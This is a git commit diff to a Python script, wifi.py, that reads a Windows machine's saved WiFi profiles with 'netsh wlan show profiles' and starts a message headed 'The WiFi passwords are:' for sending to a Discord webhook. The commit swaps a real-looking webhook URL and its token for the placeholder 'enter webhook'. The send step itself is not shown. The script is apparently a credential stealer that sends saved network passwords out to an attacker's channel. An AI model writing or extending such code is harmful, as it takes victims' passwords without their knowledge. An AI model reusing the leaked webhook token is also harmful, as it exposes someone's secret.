f9e7a8cfc6439c58cdad6e3ca94802afa5a4ce7b
S13cko <125689079+S13cko@users.noreply.github.com>
2023-02-17 21:44:44 +0330

    Update wifi.py

--- wifi.py
+++ wifi.py
@@ -1,7 +1,7 @@
 import subprocess
 import requests
 
-webhook_url = "https://discord.com/api/webhooks/1074033255826866196/ufegsCXGw6RI5g6K6mtRf7-S7My3oAYlkL_eGjnOHl7Jv3m3pNernMhvjj6dreSy70u0"
+webhook_url = "enter webhook"
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
 profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 message = "The WiFi passwords are:\n"
